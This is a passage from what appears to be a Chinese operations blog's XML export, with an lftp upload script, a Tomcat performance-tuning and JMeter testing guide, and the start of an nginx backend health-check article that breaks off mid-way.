其他服务器上传文件登陆服务器192.168.1.199建立文件夹/usr/sunxu，并上传至192.168.1.200默认路径(-d为debug模式)/data/sftp/mysftp/upload 1用法：lftp 用户名:密码@ftp地址:传送端口（默认21） 1234#此处命令在服务器192.168.1.199执行mkdir /usr/sunxulftp "sftp://用户名:密码@192.168.1.200" -e "PUT /usr/sunxu" -d 查看192.168.1.200是否有sunxu文件夹 使用shell上传12345678910111213141516171819202122232425262728293031323334#/bin/bashif [ -f ~/.bash_profile ];then . ~/.bash_profilefiFTP_ADDR=192.168.1.200FTP_USER=用户名FTP_PASS=密码FILE_ROOT_PATH=/usr/TicketEBPdata/FILE_PATH=/usr/TicketEBPdata/output/LOG_FILE=/usr/TicketEBPdata/output/lftp_output.txtftpFunction() &#123; lftp "sftp://$FTP_USER:$FTP_PASS@$FTP_ADDR" -e "PUT $FILE_PATH$1" &gt;$LOG_FILE 2&gt;&amp;1 &lt;&lt;- EOFbyeEOF&#125;filelist=`ls $FILE_PATH`for file in $filelistdo if [ -f "$FILE_PATH""$file" ];thenecho $file; ftpFunction $file if [ -s "$LOG_FILE" ]; then mv $LOG_FILE $FILE_ROOT_PATH break else rm -rf $LOG_FILE mv output/* history -f fi fidone]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat性能优化和测试]]></title>
    <url>%2Farticles%2F6f151fe3.html</url>
    <content type="text"><![CDATA[目的Tomcat是我们经常使用的 servlet容器之一，甚至很多线上产品都使用 Tomcat充当服务器。而且优化后的Tomcat性能提升显著，本文从以下几方面进行分析优化。 内存优化默认情况下Tomcat的相关内存配置较低，这对于一些大型项目显然是不够用的，这些项目运行就已经耗费了大部分内存空间，何况大规模访问的情况。即使是本文中的这个只有一个页面的超小项目，在并发达到一定程度后也会抛出OOM（OutOfMemoryError）的异常报错。 OOM报错：说明Tomcat已经无力支持访问处理，内部GC也已经“无能无力”。所以一般情况下我们需要重新配置Tomcat的相关内存大小。 修改内存等 JVM相关配置Linux下修改TOMCAT_HOME/bin/catalina.sh，在其中加入，可以放在CLASSPATH=下面： 1JAVA_OPTS="-server -XX:PermSize=512M -XX:MaxPermSize=1024m -Xms2048m -Xmx2048m" windows下修改TOMCAT_HOME/bin/catalina.bat，在其中加入，可以放在set CLASSPATH=下面： 1set JAVA_OPTS=-server -XX:PermSize=512M -XX:MaxPermSize=1024m -Xms2048m -Xmx2048m 这些参数在我们学习JVM部分文章时已经都认识过了，不过这里还是简单介绍下: 12345-server：启用 JDK的 server 版本；-Xms：Java虚拟机初始化时堆的最小内存,一般与Xmx配置为相同值,好处是GC不必再为扩展内存空间而消耗性能；-Xmx：Java虚拟机可使用堆的最大内存；-XX:PermSize：Java虚拟机永久代大小；-XX:MaxPermSize：Java虚拟机永久代大小最大值； 除了这些参数外您还可以根据具体需要配置其他参数，参数的配置可以参考JVM参数的配置JDK7和JDK8。 验证设置成功后我们可以利用JDK自带的工具进行验证，这些工具都在JAVA_HOME/bin目录下： 1）jps：用来显示本地的java进程，以及进程号，进程启动的路径等。 2）jmap：观察运行中的JVM 物理内存的占用情况，包括Heap size,Perm size等。 进入命令行模式后，进入JAVA_HOME/bin目录下，然后输入jps命令： 1234jps #显示以下结果 2340 Bootstrap 6696 Jps 其中 Bootstrap进程就是我们启动了的 Tomcat，其进程号为2340. 然后我们利用 jmap工具查看其内存相关配置： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051jmap -heap 2340 #显示以下结果 Attaching to process ID 2340, please wait... Debugger attached successfully. Server compiler detected. JVM version is 24.65-b04 using thread-local object allocation. Parallel GC with 4 thread(s) Heap Configuration: MinHeapFreeRatio = 0 MaxHeapFreeRatio = 100 MaxHeapSize = 2147483648 (2048.0MB) //最大堆内存 NewSize = 1310720 (1.25MB) MaxNewSize = 17592186044415 MB OldSize = 5439488 (5.1875MB) NewRatio = 2 SurvivorRatio = 8 PermSize = 536870912 (512.0MB) //永久代初始大小 MaxPermSize = 1073741824 (1024.0MB) //永久代最大大小 G1HeapRegionSize = 0 (0.0MB) Heap Usage: PS Young Generation Eden Space: capacity = 537919488 (513.0MB) used = 247606720 (236.13616943359375MB) free = 290312768 (276.86383056640625MB) 46.03044238471613% used From Space: capacity = 89128960 (85.0MB) used = 0 (0.0MB) free = 89128960 (85.0MB) 0.0% used To Space: capacity = 89128960 (85.0MB) used = 0 (0.0MB) free = 89128960 (85.0MB) 0.0% used PS Old Generation capacity = 1431830528 (1365.5MB) used = 0 (0.0MB) free = 1431830528 (1365.5MB) 0.0% used PS Perm Generation capacity = 536870912 (512.0MB) used = 20770360 (19.80815887451172MB) free = 516100552 (492.1918411254883MB) 3.86878103017807% used 12005 interned Strings occupying 1039352 bytes. 从结果就可以看出我们的配置已经成功了。 配置优化我们知道TOMCAT_HOME/conf/server.xml可以配置端口，虚拟路径等等 Tomcat相关主要配置。 Connector 优化Connector是连接器，负责接收客户的请求，以及向客户端回送响应的消息。所以 Connector的优化是重要部分。默认情况下 Tomcat只支持200线程访问，超过这个数量的连接将被等待甚至超时放弃，所以我们需要提高这方面的处理能力。 修改这部分配置需要修改TOMCAT_HOME/conf/server.xml，打开server.xml找到Connector 标签项，默认配置如下： 123&lt;Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" /&gt; 其中port代表服务接口；protocol代表协议类型；connectionTimeout代表连接超时时间，单位为毫秒；redirectPort代表安全通信（https）转发端口，一般配置成443。 可以看到除了这几个基本配置外并无特殊功能，所以我们需要对 Connector 进行扩展。 其中Connector 支持参数属性可以参考Tomcat官方网站非常多，所以本文就只介绍些常用的。 我们将 Connector 配置修改为如下： 123456789101112131415&lt;Connector port="8080" protocol="HTTP/1.1" maxThreads="1000" minSpareThreads="100" acceptCount="1000" maxConnections="1000" connectionTimeout="20000" maxHttpHeaderSize="8192" tcpNoDelay="true" compression="on" compressionMinSize="2048" disableUploadTimeout="true" redirectPort="8443" enableLookups="false" URIEncoding="UTF-8" /&gt; 1）port：代表Tomcat监听端口，也就是网站的访问端口，默认为8080，可以根据需要改成其他。 2）protocol：协议类型，可选类型有四种，分别为BIO（阻塞型IO），NIO，NIO2和APR。 ​ 1）BIO：BIO(Blocking I/O)，顾名思义，即阻塞式I/O操作，表示Tomcat使用的是传统的Java I/O操作(即java.io包及其子包)。Tomcat在默认情况下，是以bio模式运行的。遗憾的是，就一般而言，bio模式是三种运行模式中性能最低的一种。BIO配置采用默认即可。 ​ 2）NIO：NIO(New I/O)，是Java SE 1.4及后续版本提供的一种新的I/O操作方式(即java.nio包及其子包)。Java nio是一个基于缓冲区、并能提供非阻塞I/O操作的Java API，因此nio也被看成是non-blocking I/O的缩写。它拥有比传统I/O操作(bio)更好的并发运行性能。要让Tomcat以nio模式来运行也比较简单，我们只需要protocol类型修改如下即可： 1234//NIO protocol="org.apache.coyote.http11.Http11NioProtocol" //NIO2 protocol="org.apache.coyote.http11.Http11Nio2Protocol" ​ 3）APR：APR(Apache Portable Runtime/Apache可移植运行时)，是Apache HTTP服务器的支持库。你可以简单地理解为:Tomcat将以JNI的形式调用 Apache HTTP服务器的核心动态链接库来处理文件读取或网络传输操作，从而大大地提高 Tomcat对静态文件的处理性能。 与配置 NIO运行模式一样，也需要将对应的 Connector节点的 protocol属性值改为： 1protocol="org.apache.coyote.http11.Http11AprProtocol" 相关APR介绍及配置会在下面专门讲。 3）maxThreads：由该连接器创建的处理请求线程的最大数目，也就是可以处理的同时请求的最大数目。如果未配置默认值为200。如果一个执行器与此连接器关联，则忽略此属性，因为该属性将被忽略，所以该连接器将使用执行器而不是一个内部线程池来执行任务。 maxThreads是一个重要的配置属性，maxThreads配置的合理直接影响了Tomcat的相关性能，所以这里我们重点讨论下。 maxThreads并不是配置的越大越好，事实上你即使配置成999999也是没有用的，因为这个最大值是受操作系统及相关硬件所制约的，并且最大值并不一定是最优值，所以我们追寻的应该是最优值而不是最大值。 QPS（Query Per Second）：每秒查询率QPS是对一个特定的查询服务器在规定时间内所处理流量多少的衡量标准。我们常常使用 QPS值来衡量一个服务器的性能。 123QPS = 并发数 / 平均响应时间或者并发数 = QPS * 平均响应时间 一个系统吞吐量通常由QPS、并发数两个因素决定，每套系统的这两个值都有一个相对极限值，在应用场景访问压力下，只要某一项达到系统最高值，系统的吞吐量就上不去了，如果压力继续增大，系统的吞吐量反而会下降，原因是系统超负荷工作，上下文切换、内存等等其它消耗导致系统性能下降。所谓吞吐量这里可以理解为每秒能处理请求的次数。 所以选择一个合理的 maxThreads值，其实并不是那么容易的事。因为过多的线程只会造成，更多的内存开销，更多的CPU开销，但是对提升QPS确毫无帮助；找到最佳线程数后通过简单的设置，可以让web系统更加稳定，得到最高，最稳定的QPS输出。 我们可以通过以下几种方式来获取 maxThreads的最佳值： 通过线上系统不断使用和用户的不断增长来进行性能测试，观察QPS，响应时间，这种方式会在爆发式增长时系统崩溃，如双12等。 根据公式计算，服务器端最佳线程数量=((线程等待时间+线程cpu时间)/线程cpu时间) * cpu数量，这种方式有时会被误导，因为某些系统处理环节可能会耗时比较长，从而影响公式的结果。 单、多用户压力测试，查看CPU的消耗，然后直接乘以百分比，再进行压测，一般这个值的附近应该就是最佳线程数量，这种方式理想场景比较适用，实际情况会比这个复杂的多。 根据系统的自身情况调整，如硬件限制，系统限制，程序处理能力限制等。 定期修改为不同的 maxThreads值，看服务器响应结果及用户反应。 QPS和线程数的关系 1）在最佳线程数量之前，QPS和线程是互相递增的关系，线程数量到了最佳线程之后，QPS持平，不在上升，甚至略有下降，同时相应时间持续上升。 2）同一个系统而言，支持的线程数越多（最佳线程数越多而不是配置的线程数越多），QPS越高 QPS和响应时间的关系 1）对于一般的web系统，响应时间一般有CPU执行时间+IO等待时间组成。 2）CPU的执行时间减少，对QPS有实质的提升，IO时间的减少，对QPS提升不明显。如果要想明显提升QPS，优化系统的时候要着重优化CPU消耗大户。 所以想要找出 maxThreads的最优值可并不容易，没有最好只有更好，更好的值只能通过时间来显现，如果你不想考虑那么多，一般情况下设置成1000即可。 4）minSpareThreads：线程的最小运行数目，这些始终保持运行。如果未指定，默认值为10。 5）acceptCount：当所有可能的请求处理线程都在使用时传入连接请求的最大队列长度。如果未指定，默认值为100。一般是设置的跟 maxThreads一样或一半，此值设置的过大会导致排队的请求超时而未被处理。所以这个值应该是主要根据应用的访问峰值与平均值来权衡配置。 6）maxConnections：在任何给定的时间内，服务器将接受和处理的最大连接数。当这个数字已经达到时，服务器将接受但不处理，等待进一步连接。NIO与NIO2的默认值为10000，APR默认值为8192。 7）connectionTimeout：当请求已经被接受，但未被处理，也就是等待中的超时时间。单位为毫秒，默认值为60000。通常情况下设置为30000。 8）maxHttpHeaderSize：请求和响应的HTTP头的最大大小，以字节为单位指定。如果没有指定，这个属性被设置为8192（8 KB）。 9）tcpNoDelay：如果为true，服务器socket会设置TCP_NO_DELAY选项，在大多数情况下可以提高性能。缺省情况下设为true。 10）compression：是否启用gzip压缩，默认为关闭状态。这个参数的可接受值为“off”（不使用压缩），“on”（压缩文本数据），“force”（在所有的情况下强制压缩）。 11）compressionMinSize：如果compression=”on”，则启用此项。被压缩前数据的最小值，也就是超过这个值后才被压缩。如果没有指定，这个属性默认为“2048”（2K），单位为byte。 12）disableUploadTimeout：这个标志允许servlet Container在一个servlet执行的时候，使用一个不同的，更长的连接超时。最终的结果是给servlet更长的时间以便完成其执行，或者在数据上载的时候更长的超时时间。如果没有指定，设为false。 13）enableLookups：关闭DNS反向查询。 14）URIEncoding：URL编码字符集。 Connector 还有很多其他参数，可以参考Tomcat官网，这里只介绍与性能相关的部分。 BIO、NIO、APR通过配置 protocol的类型可以使用不同的 Connector处理请求。 12345678//BIO protocol="HTTP/1.1" //NIO protocol="org.apache.coyote.http11.Http11NioProtocol" //NIO2 protocol="org.apache.coyote.http11.Http11Nio2Protocol" //APR protocol="org.apache.coyote.http11.Http11AprProtocol" 以下是几种类型 Connector的参数对比： 并不是说 BIO的性能就一定不如 NIO，这几种类型 Connector之间并没有明显的性能区别，它们之间实现流程和原理不同，所以它们的选择是需要根据应用的类型来决定的。 BIO更适合处理简单流程，如程序处理较快可以立即返回结果。简单项目及应用可以采用BIO。 NIO更适合后台需要耗时完成请求的操作，如程序接到了请求后需要比较耗时的处理这已请求，所以无法立即返回结果，这样如果采用BIO就会占用一个连接，而使用NIO后就可以将此连接转让给其他请求，直至程序处理完成返回为止。 APR可以大大提升Tomcat对静态文件的处理性能，同时如果你使用了HTTPS方式传输的话，也可以提升SSL的处理性能。 本文的最后会对几种 Connector进行对比测试。 线程池Executor代表了一个线程池，可以在Tomcat组件之间共享。使用线程池的好处在于减少了创建销毁线程的相关消耗，而且可以提高线程的使用效率。 要想使用线程池，首先需要在 Service标签中配置 Executor，如下： 1234567891011&lt;Service name="Catalina"&gt; &lt;Executor name="tomcatThreadPool" namePrefix="catalina-exec-" maxThreads="1000" minSpareThreads="100" maxIdleTime="60000" maxQueueSize="Integer.MAX_VALUE" prestartminSpareThreads="false" threadPriority="5" className="org.apache.catalina.core.StandardThreadExecutor"/&gt; 其中， name：线程池名称，用于 Connector中指定。 ​ namePrefix：所创建的每个线程的名称前缀，一个单独的线程名称为 namePrefix+threadNumber。 ​ maxThreads：池中最大线程数。 ​ minSpareThreads：活跃线程数，也就是核心池线程数，这些线程不会被销毁，会一直存在。 ​ maxIdleTime：线程空闲时间，超过该时间后，空闲线程会被销毁，默认值为6000（1分钟），单位毫秒。 ​ maxQueueSize：在被执行前最大线程排队数目，默认为Int的最大值，也就是广义的无限。除非特殊情况，这个值不需要更改，否则会有请求不会被处理的情况发生。 ​ prestartminSpareThreads：启动线程池时是否启动 minSpareThreads部分线程。默认值为false，即不启动。 ​ threadPriority：线程池中线程优先级，默认值为5，值从1到10。 ​ className：线程池实现类，未指定情况下，默认实现类为org.apache.catalina.core.StandardThreadExecutor。如果想使用自定义线程池首先需要实现 org.apache.catalina.Executor接口。 线程池配置完成后需要在 Connector中指定： 12&lt;Connector executor="tomcatThreadPool" ... Listener另一个影响Tomcat 性能的因素是内存泄露。Server标签中可以配置多个Listener，其中 JreMemoryLeakPreventionListener是用来预防JRE内存泄漏。此Listener只需在Server标签中配置即可，默认情况下无需配置，已经添加在 Server中。 1&lt;Listener className="org.apache.catalina.core.JreMemoryLeakPreventionListener" /&gt; 组件优化APR介绍​ 之前一直都在说APR，那么APR到底能给我们带来什么？这节就开始学习APR相关知识。 ​ APR(Apache Portable Runtime)是一个高可移植库，它是Apache HTTP Server 2.x的核心。APR有很多用途，包括访问高级 IO功能(例如sendfile,epoll和OpenSSL)，OS级别功能(随机数生成，系统状态等等)，本地进程管理(共享内存，NT管道和UNIX sockets)。这些功能可以使Tomcat作为一个通常的前台WEB服务器，能更好地和其它本地web技术集成，总体上让Java更有效率作为一个高性能web服务器平台而不是简单作为后台容器。 ​ APR的目的如其名称一样，主要为上层的应用程序提供一个可以跨越多操作系统平台使用的底层支持接口库。在早期的Apache版本中，应用程序本身必须能够处理各种具体操作系统平台的细节，并针对不同的平台调用不同的处理函数。随着Apache的进一步开发，Apache组织决定将这些通用的函数独立出来并发展成为一个新的项目。这样，APR的开发就从Apache中独立出来，Apache仅仅是使用APR而已。目前APR主要还是由Apache使用，不过由于APR的较好的移植性，因此一些需要进行移植的C程序也开始使用APR。 ​ APR使得平台细节的处理进行下移。对于应用程序而言，它们根本就不需要考虑具体的平台，不管是Unix、Linux还是Window，应用程序执行的接口基本都是统一一致的。因此对于APR而言，可移植性和统一的上层接口是其考虑的一个重点。而APR最早的目的并不是如此，它最早只是希望将Apache中用到的所有代码合并为一个通用的代码库，然而这不是一个正确的策略，因此后来APR改变了其目标。有的时候使用公共代码并不是一件好事，比如如何将一个请求映射到线程或者进程是平台相关的，因此仅仅一个公共的代码库并不能完成这种区分。APR的目标则是希望安全合并所有的能够合并的代码而不需要牺牲性能。 下载 APR没有二进制包可以下载，所以只能下载源代码版，下载后需要构建，需要下载的文件有：apr-1.5.2.tar.gz、apr-iconv-1.2.1.tar.gz、apr-util-1.5.4.tar.gz（Linux版为例）这三个。 APR的官网为：http://apr.apache.org/ 安装​ windows下构建源代码比较麻烦，需要Visual Studio支持。 ​ Linux下构建就相对简单和熟悉了，只需要执行常规构建命令即可： 123./configure --prefix=/usr/local/apr make make install ​ 安装成功后，APR会默认安装在 /usr/local/apr目录下，也可以指定安装目录。 ​ apr-iconv安装时需要指定apr的安装位置： 123./configure --prefix=/usr/local/apr-iconv --with-apr=/usr/local/apr make make install ​ apr-util安装时需要指定apr的安装位置： 123./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr --with-apr-iconv=/usr/local/apr-iconv/bin/apriconv make make install ​ 安装完成后目录结构： 安装完成后其实是无法直接使用APR的，想使用APR还需要安装Tomcat Native，否则Tomcat启动时会报以下错误： 116-May-2016 02:52:42.992 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: /usr/local/apr/lib:/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib Tomcat Native​ Tomcat Native是 Tomcat可选组件，它可以让 Tomcat使用 Apache 的 APR包来处理包括文件和网络IO操作，从而提升性能及兼容性。 下载​ Tomcat Native可以选择Windows与Linux版本下载。 ​ Tomcat Native下载地址为：http://tomcat.apache.org/download-native.cgi 安装 （1）Linux/Unix下 ​ 安装Tomcat Native前需要安装以下组件： ​ • APR library（我们已安装） ​ • OpenSSL libraries ​ • Java SE Development Kit (JDK)（也已安装） ​ OpenSSL libraries安装通过以下命令： 1yum install apr-devel openssl-devel 安装成功后就可以安装Tomcat Native了，运行以下命令下载地址： 1234./configure --with-apr=/usr/local/apr/bin/apr-1-config \ --with-java-home=/usr/java/jdk1.7.0_79 \ --with-ssl=yes \ --prefix=/usr/local/tomcat 注意，–prefix指向的是 Tomcat目录。 注意，下载后的 Tomcat Native解压后目录结构如下： ​ 安装时需要进入native目录。​ 安装过程中还有可能产生依赖包版本不兼容的问题（一般为openssl版本过低），这时需要卸载旧的依赖，并安装最新版本 ​ 当安装完成后出现以下类似输出时，说明安装已经成功： 123456789101112131415161718Libraries have been installed in: /usr/local/tomcat/lib If you ever happen to want to link against installed libraries in a given directory, LIBDIR, you must either use libtool, and specify the full pathname of the library, or use the `-LLIBDIR&apos; flag during linking and do at least one of the following: - add LIBDIR to the `LD_LIBRARY_PATH&apos; environment variable during execution - add LIBDIR to the `LD_RUN_PATH&apos; environment variable during linking - use the `-Wl,-rpath -Wl,LIBDIR&apos; linker flag - have your system administrator add LIBDIR to `/etc/ld.so.conf&apos; See any operating system documentation about shared libraries for more information, such as the ld(1) and ld.so(8) manual pages. （2）Windows下 ​ Windows下安装就异常简单了，只需要把bin目录下文件复制到tomcat/bin下即可，如果为64位，则复制x64中文件。 使用 环境变量配置 ​ 使用前需要配置环境变量： 1vi /etc/profile ​ 打开配置文件后，添加以下内容： 1export LD_LIBRARY_PATH=/usr/local/apr/lib ​ 退出保存，然后执行： 1source /etc/profile ​ 修改Tomcat配置文件 ​ 打开conf/server.xml文件，修改Connector 标志的protocol属性： 1protocol=&quot;org.apache.coyote.http11.Http11AprProtocol&quot; ​ 然后添加Listener： 1&lt;Listener className=&quot;org.apache.catalina.core.AprLifecycleListener&quot; SSLEngine=&quot;on&quot; /&gt; ​ 保存配置文件后，启动Tomcat，从日志中看到以下输出时，说明全部功能都已配置成功： 12316-May-2016 04:28:54.734 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent Loaded APR based Apache Tomcat Native library 1.1.34 using APR version 1.5.2. 16-May-2016 04:28:54.734 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true]. 16-May-2016 04:28:54.739 INFO [main] org.apache.catalina.core.AprLifecycleListener.initializeSSL OpenSSL successfully initialized (OpenSSL 1.0.2h 3 May 2016) ​ 至此，APR与 Native都已安装完成，可以使用，对于 APR与 Native还有很多知识要学习，但不是本文的重点，所以以后有机会还会深入学习。 性能测试​ Tomcat优化部分我们已经完成，接下来就需要比较一下优化前与优化后的性能对比。 Jmeter介绍​ Apache JMeter是Apache组织开发的基于Java的压力测试工具。用于对软件做压力测试，它最初被设计用于Web应用测试，但后来扩展到其他测试领域。 它可以用于测试静态和动态资源，例如静态文件、Java 小服务程序、CGI 脚本、Java 对象、数据库、FTP 服务器， 等等。JMeter 可以用于对服务器、网络或对象模拟巨大的负载，来自不同压力类别下测试它们的强度和分析整体性能。另外，JMeter能够对应用程序做功能/回归测试，通过创建带有断言的脚本来验证你的程序返回了你期望的结果。为了最大限度的灵活性，JMeter允许使用正则表达式创建断言。 ​ Apache jmeter 可以用于对静态的和动态的资源（文件，Servlet，Perl脚本，java 对象，数据库和查询，FTP服务器等等）的性能进行测试。它可以用于对服务器、网络或对象模拟繁重的负载来测试它们的强度或分析不同压力类型下的整体性能。你可以使用它做性能的图形分析或在大并发负载测试你的服务器/脚本/对象。 ​ Jmeter官网：http://jmeter.apache.org/ ​ 1）JMeter的作用 （1）能够对HTTP和FTP服务器进行压力和性能测试， 也可以对任何数据库进行同样的测试（通过JDBC），Jmeter支持以下服务器协议类型测试： ​ • Web - HTTP, HTTPS ​ • SOAP / REST ​ • FTP ​ • Database via JDBC ​ • LDAP ​ • Message-oriented middleware (MOM) via JMS ​ • Mail - SMTP(S), POP3(S) and IMAP(S) ​ • MongoDB (NoSQL) ​ • Native commands or shell scripts ​ • TCP （2）完全的可移植性和100% 纯java。 （3）完全 Swing 和轻量组件支持（预编译的JAR使用 javax.swing.*)包。 （4）完全多线程 框架允许通过多个线程并发取样和 通过单独的线程组对不同的功能同时取样。 （5）精心的GUI设计允许快速操作和更精确的计时。 （6）缓存和离线分析/回放测试结果。 JMeter特性 （1）可链接的取样器允许无限制的测试能力。 （2）各种负载统计表和可链接的计时器可供选择。 （3）数据分析和可视化插件提供了很好的可扩展性以及个性化。 （4）具有提供动态输入到测试的功能（包括JavaScript）。 （5）支持脚本编程的取样器（在1.9.2及以上版本支持BeanShell）。 ​ 在设计阶段，JMeter能够充当HTTP PROXY（代理）来记录IE/NETSCAPE的HTTP请求，也可以记录apache等WebServer的log文件来重现HTTP流量。当这些HTTP客户端请求被记录以后，测试运行时可以方便的设置重复次数和并发度（线程数）来产生巨大的流量。JMeter还提供可视化组件以及报表工具把量服务器在不同压力下的性能展现出来。 ​ 相比其他HTTP测试工具,JMeter最主要的特点在于扩展性强。JMeter能够自动扫描其lib/ext子目录下.jar文件中的插件，并且将其装载到内存，让用户通过不同的菜单调用。 Jmeter使用​ 使用Jmeter非常简单，windows下进入bin目录直接双击jmeter.bat文件即可，Linux下类似，需要运行jmeter.sh文件，Jmeter运行后显示以下界面： ​ Jmeter使用起来比较简单，附件是一个简单的配置，直接导入即可使用。 测试条件12345678910Tomcat版本：8.0.33测试项目：新创建一个web项目也不用实现任何代码，只需要部署即可以使用，只有一个index.jsp文件。JDK版本：jdk1.7.0.67请求方式：POST循环次数：100，1000线程数：10,100,1000总次数：总次数 = 线程数 * 循环次数CPU：英特尔 第二代酷睿 i5-2450M（双核）内存：8GB附件时Jmeter的配置文件，可以直接导入使用。 测试结果​ 从部分结果来看优化过的Tomcat会比默认性能及并发处理能力上有提高，但至于参数的配置需要结合硬件及操作系统来不断调整，所以并不会有一个万能的参数来使用，需要各位不断的测试不断更改。 ​ 以下是一个简单的测试结果，循环100次，线程数分别为10,100,1000： ​ 各位估计已经发现了相同的应用下并不一定某种protocol就一定性能出色，因为Tomcat中的这个测试项目只有一个index.jsp页面，在较少线程数访问情况下BIO反应最快，而当线程数达到1000时NIO2性能最出色，而APR中规中矩，虽然这种测试的局限性很大，但也可以反映出：想要找出适合的配置及最佳性能需要结合实际，不断的测试与改进，最终才能达到一个相对稳定的性能，虽然此时的性能未必是最佳的，但却是能应对绝大多数情况的。 总结：Tomcat相关优化也只是一个入门介绍，每一种技术之中还是有很多很深奥的知识要去学习，只有不断的去学习才能不断的提高。]]></content>
      <categories>
        <category>应用运维</category>
        <category>容器优化</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx之后端节点健康检查]]></title>
    <url>%2Farticles%2Fd05be736.html</url>
    <content type="text"><![CDATA[背景公司前一段对业务线上的nginx做了整理，重点就是对nginx上负载均衡器的后端节点做健康检查。目前，nginx对后端节点健康检查的方式主要有3种，这里列出： 123456781、ngx_http_proxy_module 模块和ngx_http_upstream_module模块（自带） 官网地址：http://nginx.org/cn/docs/http/ngx_http_proxy_module.html#proxy_next_upstream2、nginx_upstream_check_module模块 官网网址：https://github.com/yaoweibin/nginx_upstream_check_module3、ngx_http_healthcheck_module模块 官网网址：http://wiki.nginx.org/NginxHttpHealthcheckModule 公司业务线上对后端节点的健康检查是通过nginx_upstream_check_module模块做的，这里我将分别介绍这三种实现方式以及之间的差异性。 模块详解ngx_http_proxy_module 模块 和ngx_http_upstream_module模块 （自带）严格来说，nginx自带是没有针对负载均衡后端节点的健康检查的，但是可以通过默认自带的 ngx_http_proxy_module 模块 和ngx_http_upstream_module模块中的相关指令来完成当后端节点出现故障时，自动切换到健康节点来提供访问。 这里列出这两个模块中相关的指令： ngx_http_proxy_module 模块中的 proxy_connect_timeout 指令、 proxy_read_timeout指令和proxy_next_upstream指令 123语法: proxy_connect_timeout time;默认值: proxy_connect_timeout 60s;上下文: http, server, location 设置与后端服务器建立连接的超时时间。应该注意这个超时一般不可能大于75秒。 123语法: proxy_read_timeout time;默认值: proxy_read_timeout 60s;上下文: http, server, location 定义从后端服务器读取响应的超时。此超时是指相邻两次读操作之间的最长时间间隔，而不是整个响应传输完成的最长时间。如果后端服务器在超时时间段内没有传输任何数据，连接将被关闭。 123语法: proxy_next_upstream error | timeout | invalid_header | http_500 | http_502 | http_503 | http_504 |http_404 | off ...;默认值: proxy_next_upstream error timeout;上下文: http, server, location 指定在何种情况下一个失败的请求应该被发送到下一台后端服务器： 123456789error # 和后端服务器建立连接时，或者向后端服务器发送请求时，或者从后端服务器接收响应头时，出现错误timeout # 和后端服务器建立连接时，或者向后端服务器发送请求时，或者从后端服务器接收响应头时，出现超时invalid_header # 后端服务器返回空响应或者非法响应头http_500 # 后端服务器返回的响应状态码为500http_502 # 后端服务器返回的响应状态码为502http_503 # 后端服务器返回的响应状态码为503http_504 # 后端服务器返回的响应状态码为504http_404 # 后端服务器返回的响应状态码为404off # 停止将请求发送给下一台后端服务器 需要理解一点的是，只有在没有向客户端发送任何数据以前，将请求转给下一台后端服务器才是可行的。也就是说，如果在传输响应到客户端时出现错误或者超时，这类错误是不可能恢复的。 范例如下： 123http &#123;proxy_next_upstream http_502 http_504 http_404 error timeout invalid_header;&#125; ngx_http_upstream_module模块中的server指令 12345语法: server address [parameters];默认值: ―上下文: upstream 范例如下： 1234upstream name &#123; server 10.1.1.110:8080 max_fails=1 fail_timeout=10s; server 10.1.1.122:8080 max_fails=1 fail_timeout=10s;&#125; 下面是每个指令的介绍： 123456max_fails=number # 设定Nginx与服务器通信的尝试失败的次数。在fail_timeout参数定义的时间段内，如果失败的次数达到此值，Nginx就认为服务器不可用。在下一个fail_timeout时间段，服务器不会再被尝试。 失败的尝试次数默认是1。设为0就会停止统计尝试次数，认为服务器是一直可用的。 你可以通过指令proxy_next_upstream、fastcgi_next_upstream和 memcached_next_upstream来配置什么是失败的尝试。 默认配置时，http_404状态不被认为是失败的尝试。fail_timeout=time # 设定服务器被认为不可用的时间段以及统计失败尝试次数的时间段。在这段时间中，服务器失败次数达到指定的尝试次数，服务器就被认为不可用。默认情况下，该超时时间是10秒。 在实际应用当中，如果你后端应用是能够快速重启的应用，比如nginx的话，自带的模块是可以满足需求的。但是需要注意。如果后端有不健康节点，负载均衡器依然会先把该请求转发给该不健康节点，然后再转发给别的节点，这样就会浪费一次转发。 可是，如果当后端应用重启时，重启操作需要很久才能完成的时候就会有可能拖死整个负载均衡器。此时，由于无法准确判断节点健康状态，导致请求handle住，出现假死状态，最终整个负载均衡器上的所有节点都无法正常响应请求。由于公司的业务程序都是java开发的，因此后端主要是nginx集群和tomcat集群。由于tomcat重启应部署上面的业务不同，有些业务启动初始化时间过长，就会导致上述现象的发生，因此不是很建议使用该模式。 并且ngx_http_upstream_module模块中的server指令中的max_fails参数设置值，也会和ngx_http_proxy_module 模块中的的proxy_next_upstream指令设置起冲突。比如如果将max_fails设置为0，则代表不对后端服务器进行健康检查，这样还会使fail_timeout参数失效（即不起作用）。此时，其实我们可以通过调节ngx_http_proxy_module 模块中的 proxy_connect_timeout 指令、proxy_read_timeout指令，通过将他们的值调低来发现不健康节点，进而将请求往健康节点转移。 以上就是nginx自带的两个和后端健康检查相关的模块。 nginx_upstream_check_module模块除了自带的上述模块，还有一个更专业的模块，来专门提供负载均衡器内节点的健康检查的。这个就是淘宝技术团队开发的 nginx 模块 nginx_upstream_check_module，通过它可以用来检测后端 realserver 的健康状态。如果后端 realserver 不可用，则所以的请求就不会转发到该节点上。 在淘宝自己的 tengine 上是自带了该模块的，大家可以访问淘宝tengine的官网来获取该版本的nginx，官方地址：http://tengine.taobao.org/ 。 如果我们没有使用淘宝的 tengine 的话，可以通过补丁的方式来添加该模块到我们自己的 nginx 中。我们业务线上就是采用该方式进行添加的。 下面是部署流程！ 下载nginx_upstream_check_module模块12345[root@localhost ~]# cd /usr/local/srcwget https://codeload.github.com/yaoweibin/nginx_upstream_check_module/zip/masterunzip master[root@localhost /usr/local/src]# ll -d nginx_upstream_check_module-masterdrwxr-xr-x. 6 root root 4096 Dec 